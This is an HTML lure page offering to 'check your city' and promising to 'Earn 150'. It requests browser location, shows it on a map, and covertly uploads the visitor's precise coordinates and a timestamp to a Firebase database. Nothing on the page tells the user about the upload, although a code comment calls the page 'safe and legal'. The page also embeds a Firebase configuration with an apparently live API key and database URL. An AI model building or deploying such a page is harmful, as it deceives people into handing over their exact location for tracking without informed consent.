<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Demo</title>

  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0f172a;
      color: #fff;
      text-align: center;
      margin: 0;
      padding: 20px;
    }
    button {
      padding: 12px 20px;
      font-size: 16px;
      border-radius: 8px;
      border: none;
      cursor: pointer;
      background: #22c55e;
      color: #000;
      margin-top: 10px;
    }
    #map {
      width: 100%;
      height: 400px;
      margin-top: 15px;
      border-radius: 12px;
    }
    #status {
      margin-top: 10px;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <h2>üìç Check your city Name</h2>
  <h2>Earn 150</h2>

  <p id="status">Click the button to allow location</p>
  <button onclick="startLocation()">Allow Location</button>

  <div id="map"></div>

  <!-- Google Maps -->
  <script async
    src="https://maps.googleapis.com/maps/api/js?key=YOUR_GOOGLE_MAPS_API_KEY">
  </script>

  <!-- Firebase + Location -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    // üî• Firebase config (YOUR REAL CONFIG)
    const firebaseConfig = {
      apiKey: "AIzaSyB0cvFKla2-uiVoxFNHv6gCiOFwbgWviS8",
      authDomain: "location-fbb81.firebaseapp.com",
      databaseURL: "https://location-fbb81-default-rtdb.firebaseio.com",
      projectId: "location-fbb81",
      storageBucket: "location-fbb81.firebasestorage.app",
      messagingSenderId: "497825343486",
      appId: "1:497825343486:web:934be874904edc34bb82af"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    let map, marker;

    function initMap(lat, lng) {
      const pos = { lat, lng };
      map = new google.maps.Map(document.getElementById("map"), {
        center: pos,
        zoom: 16
      });
      marker = new google.maps.Marker({
        position: pos,
        map: map,
        title: "You are here"
      });
    }

    // ‚úÖ Button-triggered permission (SAFE & LEGAL)
    window.startLocation = function () {
      if (!navigator.geolocation) {
        document.getElementById("status").innerText =
          "‚ùå Geolocation not supported";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude;
          const lng = pos.coords.longitude;

          document.getElementById("status").innerText =
            `Location: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;

          if (!map) initMap(lat, lng);
          else {
            marker.setPosition({ lat, lng });
            map.panTo({ lat, lng });
          }

          // üî• SAVE TO FIREBASE
          set(ref(db, "userLocation"), {
            lat: lat,
            lng: lng,
            time: new Date().toISOString()
          });
        },
        () => {
          document.getElementById("status").innerHTML =
            "‚ùå Location blocked.<br>Click üîí icon in address bar ‚Üí Allow Location ‚Üí Reload";
        }
      );
    };
  </script>

</body>
</html>
